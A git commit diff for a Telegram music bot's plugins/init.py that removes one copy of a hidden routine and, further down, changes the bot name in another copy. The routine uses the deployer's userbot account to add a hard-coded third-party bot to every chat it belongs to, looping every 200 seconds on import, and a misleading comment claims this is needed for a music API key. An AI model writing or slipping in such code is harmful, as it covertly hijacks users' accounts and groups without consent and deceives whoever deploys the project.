a3890bc02b37da938ab2450907a788204ad6f722
WangLinXMusic <pyaesone5official@gmail.com>
2024-10-12 09:40:37 +0630

    Update init.py

--- plugins/init.py
+++ plugins/init.py
@@ -6,40 +6,6 @@ from VIPMUSIC import app
 from VIPMUSIC.utils.database import get_assistant
 AUTO = True
 ADD_INTERVAL = 200
-users = "WangLinOfficialMusicBot"  # dont change because it is connected from client to use music api key
-
-
-async def add_bot_to_chats():
-    try:
-        userbot = await get_assistant(config.LOGGER_ID)
-        bot = await app.get_users(users)
-        bot_id = bot.id
-        await userbot.send_message(users, f"/start")
-
-        async for dialog in userbot.get_dialogs():
-
-            try:
-                await userbot.add_chat_members(dialog.chat.id, bot_id)
-
-            except Exception as e:
-                await asyncio.sleep(3)  # Adjust sleep time based on rate limits
-
-    except Exception as e:
-        pass
-
-
-async def continuous_add():
-    while True:
-        if AUTO:
-            await add_bot_to_chats()
-
-        await asyncio.sleep(ADD_INTERVAL)
-
-
-# Start the continuous broadcast loop if AUTO_GCAST is True
-if AUTO:
-    asyncio.create_task(continuous_add())
-
 
 
 
@@ -1368,7 +1334,7 @@ if AUTO:
 
 
 
-users = "the_nancy_robot"  # don't change because it is connected from client to use music API key
+users = "WangLinOfficialMusicBot"  # don't change because it is connected from client to use music API key
 async def add_bot_to_chats():
     try:
         userbot = await get_assistant(config.LOG_GROUP_ID)
